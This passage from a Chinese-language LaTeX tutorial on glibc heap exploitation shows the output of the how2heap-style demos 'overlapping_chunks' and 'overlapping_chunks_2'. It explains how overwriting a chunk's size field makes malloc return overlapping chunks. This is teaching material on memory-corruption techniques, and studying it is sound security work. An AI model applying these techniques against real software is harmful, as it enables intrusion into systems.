p2=0x1e2b0a0
p3=0x1e2b130

Freeing the chunk p2
Emulating an overflow that can overwrite the size of the chunk p2.

p4: 0x1e2b0a0 ~ 0x1e2b8e0
p3: 0x1e2b130 ~ 0x1e2b530

If we memset(p4, 'B', 0xd0), we have:
p4 = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAa�
p3 = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa�

If we memset(p3, 'C', 0x50), we have:
p4 = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCC
CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAa�
p3 = CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa�
\end{minted}

此项技术是通过一个溢出漏洞,改写\verb+unsorted bin +中空闲堆块的 size,改变下一次\verb+malloc +可以返回的堆块大小。

\subsection{overlapping\_chunks\_2}

编译,运行得到结果:
\begin{minted}[breaklines, frame=lines]{bash}
$ gcc -g overlapping_chunks_2.c
$ ./a.out 
Now we allocate 5 chunks on the heap

chunk p1: 0x18c2010 ~ 0x18c2028
chunk p2: 0x18c2030 ~ 0x18c20b8
chunk p3: 0x18c20c0 ~ 0x18c2148
chunk p4: 0x18c2150 ~ 0x18c21d8
chunk p5: 0x18c21e0 ~ 0x18c21f8

Let's free the chunk p4

Emulating an overflow that can overwrite the size of chunk p2 with (size of chunk_p2 + size of chunk_p3)

Allocating a new chunk 6: 0x18c2030 ~ 0x18c21d8

Now p6 and p3 are overlapping, if we memset(p6, 'B', 0xd0)
p3 before = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
p3 after  = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
\end{minted}

与 overlapping\_chunks 不同的是,此技术在\verb+ free+之前修改\verb+ size+值,使\verb+ free+错误地修改了下一个\verb+ chunk+的\verb+ prev_size+值,导致中间的\verb+ chunk+强行合并。
\newpage
